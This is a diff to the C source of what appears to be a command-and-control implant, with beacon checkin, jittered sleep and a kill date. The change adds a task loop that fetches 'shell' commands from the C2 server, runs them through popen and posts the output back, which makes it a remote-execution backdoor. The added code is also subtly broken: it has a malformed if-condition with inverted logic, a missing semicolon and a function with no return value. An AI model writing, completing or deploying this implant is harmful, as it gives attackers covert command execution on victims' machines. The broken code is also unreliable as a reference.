@@ -23,6 +23,13 @@ typedef struct {
     char killdate[32];  //
 } implant_config;
 
+typedef struct {
+char cmd[20];
+char params[30];
+double ts;
+char uuid[37];
+} task;
+
 char json_buff[250];
 
 //implant_config config = {
@@ -107,9 +114,23 @@ char* checkin(){
 }
 	
 void get_tasks(){
-send_c2_post_request('{"action": "get_tasking", "tasking_size": -1}');
+char* tasks_json = send_c2_post_request('{"action": "get_tasking", "tasking_size": -1}');
+cJSON *root = cJSON_Parse(tasks_json);
+if (root != NULL) {
+cJSON *tasks = cJSON_GetObjectItemCaseSensitive(root, "tasks");
+if(cJSON_IsArray(tasks)){
+cJSON *task = NULL;
+
+cJSON_ArrayForEach(task,tasks){
+    dispatcher(task);
+                              }
+
+                       }
+
+                 }
+cJSON_Delete(root);
 return;
-}
+              }
 
 bool sleep_with_jitter(int interval, int jitter){
     int variation = (interval * jitter)/100;
@@ -118,13 +139,49 @@ bool sleep_with_jitter(int interval, int jitter){
 return 0;
 }
 
+void dispatcher(cJSON *task){
+    if strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"shell"){
+        char* command_output = handle_shell_cmd(task);
+        cJSON *root = cJSON_CreateObject();
+        cJSON_AddStringToObject(root,"action","post_response");
+        cJSON *arr = cJSON_CreateArray();
+        cJSON_AddItemToObject(root,"responses",arr);
+        
+            cJSON *obj1 = cJSON_CreateObject();
+            cJSON_AddStringToObject(obj1,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring);
+            cJSON_AddStringToObject(obj1,"user_output",command_output);
+            cJSON_AddItemToArray(arr,obj1);
 
+        char* command_executed = cJSON_Print(root);
+        send_c2_post_request(command_executed);
+
+        free(command_output);
+    }
+    else{
+        printf(":( unknown command detected\n");
+    }
+
+}
+
+char* handle_shell_cmd(cJSON *task){
+     FILE *fp;
+     char *command = cJSON_GetObjectItemCaseSensitive(task, "parameters")->valuestring
+     char output[512];
+
+     fp = popen(command,"r"); 
+        size_t read = fread(output,512,1,fp);
+    fclose(fp);
+
+char* ret_val = (char*)malloc(read+1);
+strncpy(ret_val,output,read+1);
+}
 
 int main(){
 	checkin();
 //main loop
     for(;;){
         get_tasks();
+        
         sleep_with_jitter(config.interval,config.jitter);
 
     }
